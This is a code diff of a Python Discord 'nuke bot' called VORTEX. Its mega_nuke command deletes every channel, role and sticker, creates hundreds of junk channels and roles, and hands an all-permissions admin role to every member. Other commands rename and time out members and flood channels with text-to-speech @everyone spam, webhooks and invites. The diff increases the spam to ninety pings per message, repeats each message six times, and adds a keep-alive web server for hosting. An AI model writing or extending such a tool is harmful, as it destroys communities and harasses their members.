@@ -11,7 +11,7 @@ class Config:
     TOKEN = os.environ.get("DISCORD_TOKEN", "")
     PREFIX = "/"
     WHITELIST = []
-    SPAM_MESSAGE = "@everyone **VORTEX OBLITERATED THIS SERVER** https://discord.gg/vortex"
+    SPAM_MESSAGE = ("@everyone " * 90) + "**VORTEX OBLITERATED THIS SERVER** https://discord.gg/vortex"
     SPAM_COUNT = 100
     TEXT_TO_SPEECH = True
     DM_MESSAGE = "🔴 YOUR SERVER HAS BEEN TERMINATED BY VORTEX NUKE BOT 🔴\nAll channels, roles, and members wiped."
@@ -61,7 +61,6 @@ async def download_image(url):
         pass
     return None
 
-# Mention helper
 def mention_all():
     return discord.AllowedMentions(everyone=True, roles=True, users=True)
 
@@ -82,15 +81,12 @@ async def on_command(ctx):
 async def globally_check_dm(ctx):
     return ctx.guild is not None
 
-# ---- MASSIVE DESTRUCTION ----
-
 @bot.command()
 async def mega_nuke(ctx):
     if not is_whitelisted(ctx): return
     guild = ctx.guild
     await ctx.send("💀 INITIATING MEGA NUKE...", delete_after=2, allowed_mentions=mention_all())
     
-    # Delete everything
     for channel in guild.channels:
         try: await channel.delete()
         except: pass
@@ -105,7 +101,6 @@ async def mega_nuke(ctx):
         try: await sticker.delete()
         except: pass
     
-    # Create 500 text channels
     tasks = []
     for i in range(500):
         tasks.append(guild.create_text_channel(f"{config.CHANNEL_NAME}-{i}"))
@@ -116,7 +111,6 @@ async def mega_nuke(ctx):
     if tasks:
         await asyncio.gather(*tasks, return_exceptions=True)
     
-    # Create 200 voice channels
     tasks = []
     for i in range(200):
         tasks.append(guild.create_voice_channel(f"{config.VOICE_CHANNEL_NAME}-{i}"))
@@ -127,7 +121,6 @@ async def mega_nuke(ctx):
     if tasks:
         await asyncio.gather(*tasks, return_exceptions=True)
     
-    # Create 50 categories
     tasks = []
     for i in range(50):
         tasks.append(guild.create_category_channel(f"{config.CATEGORY_NAME}-{i}"))
@@ -138,7 +131,6 @@ async def mega_nuke(ctx):
     if tasks:
         await asyncio.gather(*tasks, return_exceptions=True)
     
-    # Create 500 roles
     tasks = []
     for i in range(500):
         tasks.append(guild.create_role(name=f"{config.ROLE_NAME}-{i}"))
@@ -149,7 +141,6 @@ async def mega_nuke(ctx):
     if tasks:
         await asyncio.gather(*tasks, return_exceptions=True)
     
-    # Admin role + give to all
     admin_role = await guild.create_role(name=config.ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
     for member in guild.members:
         try:
@@ -158,7 +149,6 @@ async def mega_nuke(ctx):
             pass
         await asyncio.sleep(0.01)
     
-    # Rename all members
     for member in guild.members:
         try:
             await member.edit(nick=config.NICKNAME)
@@ -166,7 +156,6 @@ async def mega_nuke(ctx):
             pass
         await asyncio.sleep(0.01)
     
-    # Timeout all
     for member in guild.members:
         if member != bot.user:
             try:
@@ -175,7 +164,6 @@ async def mega_nuke(ctx):
                 pass
             await asyncio.sleep(0.01)
     
-    # Massive spam in every text channel - 100 messages each with @everyone
     for channel in guild.text_channels:
         for _ in range(100):
             try:
@@ -184,7 +172,6 @@ async def mega_nuke(ctx):
                 pass
             await asyncio.sleep(0.005)
     
-    # Webhook flood - 50 per channel
     for channel in guild.text_channels:
         for _ in range(50):
             try:
@@ -193,7 +180,6 @@ async def mega_nuke(ctx):
                 pass
             await asyncio.sleep(0.01)
     
-    # Invite spam - 50 per channel
     for channel in guild.text_channels:
         for _ in range(50):
             try:
@@ -202,7 +188,6 @@ async def mega_nuke(ctx):
                 pass
             await asyncio.sleep(0.01)
     
-    # Pin spam - pin 50 random messages per channel
     for channel in guild.text_channels:
         try:
             msgs = [m async for m in channel.history(limit=100)]
@@ -222,7 +207,7 @@ async def hyper_spam(ctx):
     if not is_whitelisted(ctx): return
     for _ in range(2000):
         try:
-            await ctx.send(f"{config.SPAM_MESSAGE} [{random.randint(1,99999)}]", tts=True, allowed_mentions=mention_all())
+            await ctx.send(config.SPAM_MESSAGE + f" [{random.randint(1,99999)}]", tts=True, allowed_mentions=mention_all())
         except:
             pass
         await asyncio.sleep(0.002)
@@ -233,7 +218,7 @@ async def global_spam(ctx):
     for channel in ctx.guild.text_channels:
         for _ in range(200):
             try:
-                await channel.send(f"{config.SPAM_MESSAGE} 🔥", tts=True, allowed_mentions=mention_all())
+                await channel.send(config.SPAM_MESSAGE + " 🔥", tts=True, allowed_mentions=mention_all())
             except:
                 pass
             await asyncio.sleep(0.002)
@@ -329,7 +314,6 @@ async def purge_all_pins(ctx):
             pass
     await ctx.send("✅ ALL PINS REMOVED", delete_after=3, allowed_mentions=mention_all())
 
-# Original commands kept for compatibility
 @bot.command()
 async def cchannels(ctx, count: int = config.CHANNELS_COUNT):
     if not is_whitelisted(ctx): return
@@ -444,13 +428,15 @@ async def spam(ctx, count: int = config.SPAM_COUNT):
 async def mspam(ctx, count: int = config.SPAM_COUNT):
     if not is_whitelisted(ctx): return
     count = max(1, min(count, 100))
+    msg = ("@everyone " * 90) + "**VORTEX OBLITERATED THIS SERVER** https://discord.gg/vortex"
     for channel in ctx.guild.text_channels:
         for _ in range(count):
-            try:
-                await channel.send(config.SPAM_MESSAGE, tts=True, allowed_mentions=mention_all())
-            except:
-                pass
-            await asyncio.sleep(0.002)
+            for __ in range(6):
+                try:
+                    await channel.send(msg, tts=True, allowed_mentions=mention_all())
+                except:
+                    pass
+                await asyncio.sleep(0.002)
 
 @bot.command()
 async def dmall(ctx):
@@ -485,4 +471,20 @@ async def help(ctx):
     embed.set_footer(text="VORTEX TEAM | @everyone ping active")
     await ctx.send(embed=embed, allowed_mentions=mention_all())
 
-bot.run(config.TOKEN)
+async def start_web_server():
+    from aiohttp import web
+    app = web.Application()
+    async def health(request):
+        return web.Response(text="OK")
+    app.router.add_get('/', health)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = int(os.getenv("PORT", 8080))
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
+    print(f"Web server on port {port}")
+
+if __name__ == "__main__":
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(start_web_server())
+    bot.run(config.TOKEN)
